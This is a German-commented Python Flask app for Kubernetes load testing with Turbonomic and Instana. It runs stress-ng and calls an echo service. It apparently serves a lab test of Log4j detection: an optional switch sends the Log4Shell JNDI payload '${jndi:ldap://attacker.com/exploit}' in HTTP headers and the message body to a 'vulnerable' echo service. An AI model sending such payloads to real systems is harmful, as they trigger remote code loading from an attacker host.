#!/usr/bin/env python3
"""
Load Testing Application für Turbonomic und Instana Testing
Webserver mit stress-ng Integration und Echo Service Communication
"""

import os
import time
import json
import logging
import subprocess
import threading
import requests
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string
from werkzeug.serving import make_server
import psutil

# Logging konfigurieren
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Global variables für Monitoring
current_stress_processes = []
echo_service_url = os.environ.get('ECHO_SERVICE_URL', 'http://vulnerable-echo-service:8085')
metrics = {
    'requests_total': 0,
    'stress_tests_running': 0,
    'echo_requests_total': 0,
    'echo_requests_failed': 0,
    'echo_requests_success': 0,
    'cpu_usage': 0.0,
    'memory_usage': 0.0,
    'last_stress_duration': 0,
    'last_echo_response_time': 0.0
}

def get_system_metrics():
    """Sammelt aktuelle System-Metriken"""
    try:
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        
        metrics['cpu_usage'] = cpu_percent
        metrics['memory_usage'] = memory.percent
        
        return {
            'cpu_percent': cpu_percent,
            'memory_percent': memory.percent,
            'memory_available_gb': round(memory.available / (1024**3), 2),
            'memory_total_gb': round(memory.total / (1024**3), 2),
            'timestamp': datetime.now().isoformat()
        }
    except Exception as e:
        logger.error(f"Fehler beim Sammeln von System-Metriken: {e}")
        return {}


def call_echo_service(message, method='POST', vulnerable_payload=False):
    """
    Ruft den vulnerablen Echo Service auf
    """
    global metrics
    
    start_time = time.time()
    
    try:
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'LoadTestApp/2.0'
        }
        
        if vulnerable_payload:
            # VULNERABLE PAYLOAD für Log4j Testing
            vulnerable_msg = "${jndi:ldap://attacker.com/exploit}"
            headers['X-Vulnerable-Header'] = vulnerable_msg
            headers['X-Log4j-Test'] = vulnerable_msg
            message = f"{message} - VULNERABLE: {vulnerable_msg}"
        
        logger.info(f"Calling Echo Service: {method} {echo_service_url}")
        
        if method.upper() == 'POST':
            # POST Request zu /echo mit JSON Body
            response = requests.post(
                f"{echo_service_url}/echo",
                json={
                    'message': message, 
                    'user_agent': headers['User-Agent'],
                    'timestamp': datetime.now().isoformat()
                },
                headers=headers,
                timeout=10
            )
            logger.info(f"POST request sent to {echo_service_url}/echo")
        else:
            # GET Request - verwende Query Parameter statt Path Parameter
            # Das ist kompatibler mit dem Java Service
            import urllib.parse
            encoded_message = urllib.parse.quote(message)
            
            # Versuche zuerst GET mit Query Parameter
            try:
                response = requests.get(
                    f"{echo_service_url}/echo",
                    params={'message': message, 'method': 'GET'},
                    headers=headers,
                    timeout=10
                )
                logger.info(f"GET request sent to {echo_service_url}/echo with query params")
            except requests.exceptions.RequestException as e:
                # Fallback: GET mit Path Parameter
                logger.warning(f"Query param GET failed, trying path param: {e}")
                response = requests.get(
                    f"{echo_service_url}/echo/{encoded_message}",
                    headers=headers,
                    timeout=10
                )
                logger.info(f"GET request sent to {echo_service_url}/echo/{encoded_message}")
        
        response_time = time.time() - start_time
        metrics['echo_requests_total'] += 1
        metrics['last_echo_response_time'] = response_time
        
        logger.info(f"Echo Service responded with status: {response.status_code}")
        
        if response.status_code == 200:
            metrics['echo_requests_success'] += 1
            try:
                response_json = response.json()
            except ValueError:
                # Falls Response kein JSON ist
                response_json = {'raw_response': response.text}
            
            return {
                'success': True,
                'response': response_json,
                'status_code': response.status_code,
                'method': method,
                'vulnerable_payload': vulnerable_payload,
                'response_time_ms': round(response_time * 1000, 2),
                'service_url': echo_service_url
            }
        else:
            metrics['echo_requests_failed'] += 1
            logger.error(f"Echo Service error: {response.status_code} - {response.text}")
            return {
                'success': False,
                'error': f"HTTP {response.status_code}: {response.text}",
                'status_code': response.status_code,
                'response_time_ms': round(response_time * 1000, 2),
                'method': method
            }
            
    except requests.exceptions.RequestException as e:
        response_time = time.time() - start_time
        metrics['echo_requests_failed'] += 1
        metrics['last_echo_response_time'] = response_time
        logger.error(f"Echo Service Request failed: {e}")
        return {
            'success': False,
            'error': str(e),
            'service_url': echo_service_url,
            'response_time_ms': round(response_time * 1000, 2),
            'method': method
        }


def run_stress_ng(cpu_workers=2, memory_workers=1, duration=30, memory_size="256M"):
    """
    Führt stress-ng mit konfigurierbaren Parametern aus
    """
    global current_stress_processes, metrics
    
    try:
        cmd = [
            'stress-ng',
            '--temp-path', '/tmp',
            '--cpu', str(cpu_workers),
            '--vm', str(memory_workers),
            '--vm-bytes', memory_size,
            '--timeout', f'{duration}s',
            '--metrics-brief',
            '--verbose'
        ]
        
        logger.info(f"Starte stress-ng: {' '.join(cmd)}")
        
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
        
        current_stress_processes.append(process)
        metrics['stress_tests_running'] += 1
        metrics['last_stress_duration'] = duration
        
        # Warte auf Prozess-Ende
        output, _ = process.communicate()
        
        # Entferne aus aktiven Prozessen
        if process in current_stress_processes:
            current_stress_processes.remove(process)
        
        metrics['stress_tests_running'] -= 1
        
        logger.info(f"stress-ng beendet mit Return Code: {process.returncode}")
        return {
            'success': True,
            'return_code': process.returncode,
            'output': output,
            'duration': duration
        }
        
    except FileNotFoundError:
        error_msg = "stress-ng ist nicht installiert. Installiere es mit: apt-get install stress-ng"
        logger.error(error_msg)
        return {'success': False, 'error': error_msg}
    except Exception as e:
        logger.error(f"Fehler beim Ausführen von stress-ng: {e}")
        metrics['stress_tests_running'] = max(0, metrics['stress_tests_running'] - 1)
        return {'success': False, 'error': str(e)}

# HTML Template für Web Interface
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Load Testing Application v2.0</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            margin: 0; 
            padding: 20px; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }
        .container { 
            max-width: 1000px; 
            margin: 0 auto; 
            background: white; 
            padding: 30px; 
            border-radius: 12px; 
            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 2px solid #f0f0f0;
        }
        .header h1 {
            color: #2c3e50;
            margin: 0;
            font-size: 2.5em;
        }
        .header p {
            color: #7f8c8d;
            margin: 10px 0;
            font-size: 1.1em;
        }
        .metrics { 
            background: linear-gradient(135deg, #e8f4f8 0%, #d4edda 100%); 
            padding: 20px; 
            border-radius: 8px; 
            margin: 20px 0;
            border-left: 5px solid #28a745;
        }
        .metrics h3 {
            color: #155724;
            margin-top: 0;
        }
        .metrics-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-top: 15px;
        }
        .metric-item {
            background: rgba(255,255,255,0.7);
            padding: 10px;
            border-radius: 6px;
            text-align: center;
        }
        .metric-value {
            font-size: 1.5em;
            font-weight: bold;
            color: #2c3e50;
        }
        .metric-label {
            font-size: 0.9em;
            color: #7f8c8d;
            margin-top: 5px;
        }
        .form-section {
            background: #f8f9fa;
            padding: 25px;
            border-radius: 8px;
            margin: 25px 0;
            border: 1px solid #e9ecef;
        }
        .form-section h3 {
            color: #495057;
            margin-top: 0;
            margin-bottom: 20px;
            font-size: 1.4em;
        }
        .form-group { 
            margin: 15px 0; 
        }
        label { 
            display: block; 
            margin-bottom: 8px; 
            font-weight: 600;
            color: #495057;
        }
        input, select, textarea { 
            padding: 12px; 
            width: 100%; 
            max-width: 300px;
            border: 2px solid #e9ecef; 
            border-radius: 6px;
            font-size: 14px;
            transition: border-color 0.3s ease;
        }
        input:focus, select:focus, textarea:focus {
            border-color: #007cba;
            outline: none;
            box-shadow: 0 0 0 3px rgba(0, 123, 186, 0.1);
        }
        textarea {
            max-width: 500px;
            min-height: 100px;
            resize: vertical;
        }
        button { 
            background: linear-gradient(135deg, #007cba 0%, #005a87 100%);
            color: white; 
            padding: 12px 24px; 
            border: none; 
            border-radius: 6px; 
            cursor: pointer; 
            margin: 8px 5px;
            font-size: 15px;
            font-weight: 600;
            transition: all 0.3s ease;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        button:hover { 
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
        }
        .btn-danger {
            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
        }
        .btn-warning {
            background: linear-gradient(135deg, #ffc107 0%, #e0a800 100%);
            color: #212529;
        }
        .status { 
            padding: 15px; 
            margin: 15px 0; 
            border-radius: 6px;
            font-weight: 500;
        }
        .success { 
            background: #d4edda; 
            border: 1px solid #c3e6cb; 
            color: #155724; 
        }
        .error { 
            background: #f8d7da; 
            border: 1px solid #f5c6cb; 
            color: #721c24; 
        }
        .warning { 
            background: #fff3cd; 
            border: 1px solid #ffeaa7; 
            color: #856404; 
        }
        .api-section {
            background: #e3f2fd;
            padding: 20px;
            border-radius: 8px;
            margin-top: 30px;
            border-left: 5px solid #2196f3;
        }
        .api-section h3 {
            color: #1565c0;
            margin-top: 0;
        }
        .endpoint {
            background: rgba(255,255,255,0.8);
            padding: 10px;
            margin: 8px 0;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
        }
        .checkbox-group {
            display: flex;
            align-items: center;
            margin: 10px 0;
        }
        .checkbox-group input[type="checkbox"] {
            width: auto;
            margin-right: 10px;
        }
        @media (max-width: 768px) {
            .container {
                padding: 20px;
                margin: 10px;
            }
            .metrics-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔥 Load Testing Application</h1>
            <p>v2.0 - Kubernetes Load Generator für Turbonomic und Instana Testing</p>
            <p><strong>Echo Service:</strong> {{ echo_service_url }}</p>
        </div>
        
        <div class="metrics">
            <h3>📊 System Metriken & Statistiken</h3>
            <div class="metrics-grid">
                <div class="metric-item">
                    <div class="metric-value">{{ metrics.cpu_usage|round(1) }}%</div>
                    <div class="metric-label">CPU Usage</div>
                </div>
                <div class="metric-item">
                    <div class="metric-value">{{ metrics.memory_usage|round(1) }}%</div>
                    <div class="metric-label">Memory Usage</div>
                </div>
                <div class="metric-item">
                    <div class="metric-value">{{ metrics.stress_tests_running }}</div>
                    <div class="metric-label">Active Stress Tests</div>
                </div>
                <div class="metric-item">
                    <div class="metric-value">{{ metrics.echo_requests_total }}</div>
                    <div class="metric-label">Echo Requests Total</div>
                </div>
                <div class="metric-item">
                    <div class="metric-value">{{ metrics.echo_requests_success }}</div>
                    <div class="metric-label">Echo Success</div>
                </div>
                <div class="metric-item">
                    <div class="metric-value">{{ metrics.echo_requests_failed }}</div>
                    <div class="metric-label">Echo Failed</div>
                </div>
                <div class="metric-item">
                    <div class="metric-value">{{ metrics.last_echo_response_time|round(3) }}s</div>
                    <div class="metric-label">Last Response Time</div>
                </div>
                <div class="metric-item">
                    <div class="metric-value">{{ metrics.requests_total }}</div>
                    <div class="metric-label">Total Requests</div>
                </div>
            </div>
        </div>

        <div class="form-section">
            <form action="/echo" method="post">
                <h3>📢 Echo Service Test</h3>
                <p style="color: #6c757d; margin-bottom: 20px;">
                    Senden Sie Nachrichten an den vulnerablen Java Echo Service für Log4j CVE-2021-44228 Testing
                </p>
                
                <div class="form-group">
                    <label for="echo_message">Nachricht für Echo Service:</label>
                    <textarea id="echo_message" name="message" placeholder="Geben Sie hier Ihre Nachricht ein...">Hello from Load Test Application v2.0!</textarea>
                </div>
                
                <div class="form-group">
                    <label for="echo_method">HTTP Method:</label>
                    <select id="echo_method" name="method">
                        <option value="POST" selected>POST /echo</option>
                        <option value="GET">GET /echo/{message}</option>
                    </select>
                </div>
                
                <div class="checkbox-group">
                    <input type="checkbox" id="vulnerable_payload" name="vulnerable_payload" value="true">
                    <label for="vulnerable_payload">
                        🚨 Include Log4j Vulnerable Payload (CVE-2021-44228 Testing)
                    </label>
                </div>
                
                <button type="submit" class="btn-danger">📢 Call Echo Service</button>
            </form>
        </div>

        <div class="form-section">
            <form action="/stress" method="post">
                <h3>⚡ Stress Test Configuration</h3>
                <p style="color: #6c757d; margin-bottom: 20px;">
                    Generieren Sie CPU und Memory Load für Performance Testing
                </p>
                
                <div class="form-group">
                    <label for="cpu_workers">CPU Workers:</label>
                    <input type="number" id="cpu_workers" name="cpu_workers" value="2" min="1" max="16">
                </div>
                
                <div class="form-group">
                    <label for="memory_workers">Memory Workers:</label>
                    <input type="number" id="memory_workers" name="memory_workers" value="1" min="1" max="8">
                </div>
                
                <div class="form-group">
                    <label for="duration">Dauer (Sekunden):</label>
                    <input type="number" id="duration" name="duration" value="30" min="5" max="3600">
                </div>
                
                <div class="form-group">
                    <label for="memory_size">Memory Size pro Worker:</label>
                    <select id="memory_size" name="memory_size">
                        <option value="128M">128MB</option>
                        <option value="256M" selected>256MB</option>
                        <option value="512M">512MB</option>
                        <option value="1G">1GB</option>
                    </select>
                </div>
                
                <button type="submit">🚀 Start Stress Test</button>
                <button type="button" onclick="stopStressTests()" class="btn-warning">⏹️ Stop All Tests</button>
            </form>
        </div>
        
        <div class="api-section">
            <h3>🔧 API Endpoints</h3>
            <div class="endpoint">GET / - Web Interface</div>
            <div class="endpoint">GET /health - Health Check</div>
            <div class="endpoint">GET /metrics - System Metriken</div>
            <div class="endpoint">POST /stress - Stress Test starten</div>
            <div class="endpoint">POST /echo - Echo Service aufrufen</div>
            <div class="endpoint">GET /status - Aktueller Status</div>
            <div class="endpoint">POST /stop - Alle Tests stoppen</div>
        </div>
    </div>

    <script>
        function stopStressTests() {
            if (confirm('Möchten Sie wirklich alle aktiven Stress Tests stoppen?')) {
                fetch('/stop', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    }
                })
                .then(response => response.json())
                .then(data => {
                    alert(data.message);
                    location.reload();
                })
                .catch(error => {
                    alert('Fehler beim Stoppen der Tests: ' + error);
                });
            }
        }

        // Auto-refresh alle 30 Sekunden
        setTimeout(() => {
            location.reload();
        }, 30000);
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    """Hauptseite mit Web Interface"""
    metrics['requests_total'] += 1
    return render_template_string(HTML_TEMPLATE, 
                                metrics=metrics, 
                                echo_service_url=echo_service_url)

@app.route('/health')
def health():
    """Health Check Endpoint für Kubernetes"""
    metrics['requests_total'] += 1
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'version': '2.0.0',
        'echo_service_url': echo_service_url
    })

@app.route('/metrics')
def get_metrics():
    """Prometheus-style Metriken für Monitoring"""
    metrics['requests_total'] += 1
    system_metrics = get_system_metrics()
    
    response = {
        'application_metrics': metrics,
        'system_metrics': system_metrics,
        'active_processes': len(current_stress_processes),
        'echo_service_status': {
            'url': echo_service_url,
            'success_rate': round(
                (metrics['echo_requests_success'] / max(metrics['echo_requests_total'], 1)) * 100, 2
            )
        }
    }
    
    return jsonify(response)

@app.route('/echo', methods=['POST'])
def call_echo():
    """Ruft den Echo Service auf"""
    metrics['requests_total'] += 1
    
    try:
        # Parameter aus Form oder JSON
        if request.is_json:
            data = request.get_json()
        else:
            data = request.form.to_dict()
        
        message = data.get('message', 'Hello from Load Test!')
        method = data.get('method', 'POST').upper()
        vulnerable_payload = data.get('vulnerable_payload') == 'true'
        
        # Echo Service aufrufen
        result = call_echo_service(message, method, vulnerable_payload)
        
        if request.is_json:
            return jsonify(result)
        else:
            # Web Interface Response
            if result['success']:
                return render_template_string("""
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Echo Service Response</title>
                    <meta charset="utf-8">
                    <style>
                        body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
                        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; }
                        .success { background: #d4edda; border: 1px solid #c3e6cb; color: #155724; padding: 20px; border-radius: 6px; }
                        .response-data { background: #f8f9fa; padding: 15px; border-radius: 4px; margin: 15px 0; }
                        pre { white-space: pre-wrap; word-wrap: break-word; }
                        .btn { background: #007cba; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; display: inline-block; margin: 10px 0; }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <div class="success">
                            <h2>✅ Echo Service Response Erhalten!</h2>
                            <p><strong>Method:</strong> {{ method }}</p>
                            <p><strong>Message:</strong> {{ message }}</p>
                            <p><strong>Response Time:</strong> {{ response_time }}ms</p>
                            {% if vulnerable_payload %}
                            <p style="color: #dc3545;"><strong>🚨 Vulnerable Payload Sent!</strong></p>
                            {% endif %}
                            
                            <div class="response-data">
                                <h4>Service Response:</h4>
                                <pre>{{ response_json }}</pre>
                            </div>
                        </div>
                        <a href="/" class="btn">← Zurück zur Hauptseite</a>
                    </div>
                    <script>setTimeout(() => window.location.href='/', 10000);</script>
                </body>
                </html>
                """, 
                method=method,
                message=message,
                vulnerable_payload=vulnerable_payload,
                response_time=result.get('response_time_ms', 0),
                response_json=json.dumps(result['response'], indent=2)
                )
            else:
                return render_template_string("""
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Echo Service Error</title>
                    <meta charset="utf-8">
                    <style>
                        body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
                        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; }
                        .error { background: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; padding: 20px; border-radius: 6px; }
                        .btn { background: #007cba; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; display: inline-block; margin: 10px 0; }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <div class="error">
                            <h2>❌ Echo Service Error</h2>
                            <p><strong>Error:</strong> {{ error }}</p>
                            <p><strong>Service URL:</strong> {{ service_url }}</p>
                            <p><strong>Response Time:</strong> {{ response_time }}ms</p>
                        </div>
                        <a href="/" class="btn">← Zurück zur Hauptseite</a>
                    </div>
                    <script>setTimeout(() => window.location.href='/', 5000);</script>
                </body>
                </html>
                """,
                error=result.get('error', 'Unknown error'),
                service_url=echo_service_url,
                response_time=result.get('response_time_ms', 0)
                )
    
    except Exception as e:
        logger.error(f"Fehler beim Echo Service Aufruf: {e}")
        error_response = {'error': str(e)}
        
        if request.is_json:
            return jsonify(error_response), 500
        else:
            return f"""
            <div style="background: #f8d7da; color: #721c24; padding: 20px; margin: 20px;">
                ❌ Fehler: {e}
            </div>
            <script>setTimeout(() => window.location.href='/', 3000);</script>
            """

@app.route('/stress', methods=['GET','POST'])
def start_stress():
    """Startet einen Stress Test"""
    metrics['requests_total'] += 1
    
    if request.method == 'GET':
        # GET Request - zeige Stress Test Form
        return render_template_string("""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Stress Test</title>
            <meta charset="utf-8">
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
                .container { max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; }
                .form-group { margin: 15px 0; }
                label { display: block; margin-bottom: 5px; font-weight: bold; }
                input, select { padding: 10px; width: 200px; border: 1px solid #ddd; border-radius: 4px; }
                button { background: #007cba; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; }
                button:hover { background: #005a87; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🔥 Stress Test Configuration</h1>
                <form action="/stress" method="post">
                    <div class="form-group">
                        <label for="cpu_workers">CPU Workers:</label>
                        <input type="number" id="cpu_workers" name="cpu_workers" value="2" min="1" max="16">
                    </div>
                    
                    <div class="form-group">
                        <label for="memory_workers">Memory Workers:</label>
                        <input type="number" id="memory_workers" name="memory_workers" value="1" min="1" max="8">
                    </div>
                    
                    <div class="form-group">
                        <label for="duration">Dauer (Sekunden):</label>
                        <input type="number" id="duration" name="duration" value="30" min="5" max="3600">
                    </div>
                    
                    <div class="form-group">
                        <label for="memory_size">Memory Size:</label>
                        <select id="memory_size" name="memory_size">
                            <option value="128M">128MB</option>
                            <option value="256M" selected>256MB</option>
                            <option value="512M">512MB</option>
                            <option value="1G">1GB</option>
                        </select>
                    </div>
                    
                    <button type="submit">🚀 Start Stress Test</button>
                    <a href="/" style="margin-left: 20px; color: #007cba; text-decoration: none;">← Back to Main</a>
                </form>
                
                <div style="margin-top: 30px; padding: 20px; background: #e8f4f8; border-radius: 6px;">
                    <h3>Current Metrics</h3>
                    <p><strong>Active Stress Tests:</strong> {{ metrics.stress_tests_running }}</p>
                    <p><strong>CPU Usage:</strong> {{ metrics.cpu_usage|round(1) }}%</p>
                    <p><strong>Memory Usage:</strong> {{ metrics.memory_usage|round(1) }}%</p>
                </div>
            </div>
        </body>
        </html>
        """, metrics=metrics)
    
    # POST Request - original stress test logic
    try:
        # Parameter aus Form oder JSON
        if request.is_json:
            data = request.get_json()
        else:
            data = request.form.to_dict()
        
        cpu_workers = int(data.get('cpu_workers', 2))
        memory_workers = int(data.get('memory_workers', 1))
        duration = int(data.get('duration', 30))
        memory_size = data.get('memory_size', '256M')
        
        # Validierung
        if duration > 3600:
            return jsonify({'error': 'Maximale Dauer ist 3600 Sekunden (1 Stunde)'}), 400
        
        # Stress Test in separatem Thread starten
        thread = threading.Thread(
            target=run_stress_ng,
            args=(cpu_workers, memory_workers, duration, memory_size)
        )
        thread.daemon = True
        thread.start()
        
        response = {
            'message': 'Stress Test gestartet',
            'parameters': {
                'cpu_workers': cpu_workers,
                'memory_workers': memory_workers,
                'duration': duration,
                'memory_size': memory_size
            },
            'timestamp': datetime.now().isoformat()
        }
        
        if request.is_json:
            return jsonify(response)
        else:
            # Redirect für Web Interface
            return f"""
            <!DOCTYPE html>
            <html>
            <head><title>Stress Test Started</title></head>
            <body style="font-family: Arial; margin: 40px;">
                <div style="background: #d4edda; color: #155724; padding: 20px; border-radius: 6px;">
                    ✅ Stress Test gestartet!<br>
                    CPU Workers: {cpu_workers}, Memory Workers: {memory_workers}<br>
                    Dauer: {duration}s, Memory Size: {memory_size}
                </div>
                <p><a href="/" style="color: #007cba;">← Zurück zur Hauptseite</a></p>
                <p><a href="/stress" style="color: #007cba;">← Neuen Stress Test starten</a></p>
                <script>setTimeout(() => window.location.href='/', 5000);</script>
            </body>
            </html>
            """
    
    except Exception as e:
        logger.error(f"Fehler beim Starten des Stress Tests: {e}")
        error_response = {'error': str(e)}
        
        if request.is_json:
            return jsonify(error_response), 500
        else:
            return f"""
            <!DOCTYPE html>
            <html>
            <body style="font-family: Arial; margin: 40px;">
                <div style="background: #f8d7da; color: #721c24; padding: 20px;">
                    ❌ Fehler: {e}
                </div>
                <p><a href="/stress">← Zurück zum Stress Test</a></p>
            </body>
            </html>
            """


@app.route('/status')
def status():
    """Status Endpoint"""
    metrics['requests_total'] += 1
    
    return jsonify({
        'active_stress_processes': len(current_stress_processes),
        'metrics': metrics,
        'echo_service': {
            'url': echo_service_url,
            'success_rate': round(
                (metrics['echo_requests_success'] / max(metrics['echo_requests_total'], 1)) * 100, 2
            )
        },
        'system_info': {
            'cpu_count': psutil.cpu_count(),
            'memory_total_gb': round(psutil.virtual_memory().total / (1024**3), 2)
        },
        'timestamp': datetime.now().isoformat()
    })

@app.route('/stop', methods=['POST'])
def stop_stress():
    """Stoppt alle aktiven Stress Tests"""
    global current_stress_processes
    
    stopped_count = 0
    for process in current_stress_processes[:]:  # Copy list to avoid modification during iteration
        try:
            process.terminate()
            process.wait(timeout=5)
            stopped_count += 1
        except Exception as e:
            logger.error(f"Fehler beim Stoppen des Prozesses: {e}")
    
    current_stress_processes.clear()
    metrics['stress_tests_running'] = 0
    
    return jsonify({
        'message': f'{stopped_count} Stress Tests gestoppt',
        'timestamp': datetime.now().isoformat()
    })

def periodic_metrics_update():
    """Aktualisiert Metriken periodisch"""
    while True:
        try:
            get_system_metrics()
            time.sleep(5)  # Update alle 5 Sekunden
        except Exception as e:
            logger.error(f"Fehler beim Aktualisieren der Metriken: {e}")
            time.sleep(10)

if __name__ == '__main__':
    # Starte Metriken-Thread
    metrics_thread = threading.Thread(target=periodic_metrics_update)
    metrics_thread.daemon = True
    metrics_thread.start()
    
    # Server konfigurieren
    port = int(os.environ.get('PORT', 8080))
    host = os.environ.get('HOST', '0.0.0.0')
    
    logger.info(f"🚀 Starte Load Testing Application v2.0 auf {host}:{port}")
    logger.info(f"Echo Service URL: {echo_service_url}")
    logger.info("Verfügbare Endpoints:")
    logger.info("  GET  / - Web Interface")
    logger.info("  GET  /health - Health Check")
    logger.info("  GET  /metrics - System Metriken")
    logger.info("  POST /stress - Stress Test starten")
    logger.info("  POST /echo - Echo Service aufrufen")
    logger.info("  GET  /status - Status Information")
    logger.info("  POST /stop - Alle Tests stoppen")
    
    # Produktionsserver für Container
    if os.environ.get('FLASK_ENV') == 'production':
        try:
            from waitress import serve
            serve(app, host=host, port=port)
        except ImportError:
            logger.warning("Waitress nicht verfügbar, nutze Flask development server")
            app.run(host=host, port=port, debug=False)
    else:
        app.run(host=host, port=port, debug=False)

